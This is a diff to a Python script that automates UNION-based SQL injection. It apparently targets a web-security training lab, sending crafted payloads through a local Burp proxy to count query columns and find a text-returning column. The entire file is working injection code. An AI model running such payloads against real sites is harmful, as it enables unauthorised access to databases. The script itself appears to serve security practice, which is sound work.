@@ -4,6 +4,8 @@ import urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+SUCCESS = 3
+
 proxies = {
     'http': 'http://127.0.0.1:8080',
     'https': 'http://127.0.0.1:8080'}
@@ -20,12 +22,14 @@ def get_exploit_column_number(url):
             return number - 1
     raise ValueError("Max number of tries exceeded, 50")
 
-def get_exploit_sqli_string_field(url, column_number):
+def get_exploit_sqli_string_field(
+        url,
+        column_number, 
+        string_to_retrieve):
     uri = "filter?category=Gifts"
     for number in range(1, column_number+1):
-        string = "'JgLv7K'"
         payload_list = ['null'] * column_number
-        payload_list[number-1] = string
+        payload_list[number-1] = string_to_retrieve
         sql_payload = (
             "' union select " + 
             ','.join(payload_list) + 
@@ -34,17 +38,19 @@ def get_exploit_sqli_string_field(url, column_number):
             url + uri + sql_payload,
             verify=False,
             proxies=proxies)
-        if response.text.count(string.strip('\'')) == 2:
+        if response.text.count(
+            string_to_retrieve.strip('\'')) == SUCCESS:
             return number
     raise ValueError("Could not find the string column")
 
 if __name__ == "__main__":
     try:
         url = sys.argv[1]
+        string_to_retrieve = sys.argv[2].strip()
         print("[+] Figuring out number of columns...")
         column_number = get_exploit_column_number(url)
         print("[+] The number of columns is " + str(column_number) + "." )
-        string_column_number = get_exploit_sqli_string_field(url, column_number)
+        string_column_number = get_exploit_sqli_string_field(url, column_number, string_to_retrieve)
         print("[+] The column that contains text is " + str(string_column_number) + ".")
     except IndexError:
         print("[-] Usage: %s <url>" % sys.argv[0])
